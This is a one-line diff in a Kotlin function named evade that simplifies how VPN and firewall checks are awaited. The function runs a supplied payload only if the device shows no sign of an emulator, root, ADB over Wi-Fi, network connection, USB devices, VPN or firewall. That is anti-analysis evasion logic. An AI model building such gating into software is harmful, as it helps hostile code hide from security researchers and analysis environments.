@@ -85,7 +85,7 @@ inline suspend fun Context.evade(requiresNetwork: Boolean = true, crossinline pa
             if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                 hasVpn = async { hasVPN() }
         }
-        evaded = !( !isEmulator.await() && !isRooted.await() && !hasAdbOverWifi.await() && !isConnected.await() && !hasUsbDevices.await() && !(hasVpn?.let { it.await() } ?: false) && !(hasFirewall?.let { it.await() } ?: false))
+        evaded = !( !isEmulator.await() && !isRooted.await() && !hasAdbOverWifi.await() && !isConnected.await() && !hasUsbDevices.await() && !(hasVpn?.await() ?: false) && !(hasFirewall?.await() ?: false))
     }
     if(!evaded)
         payload()
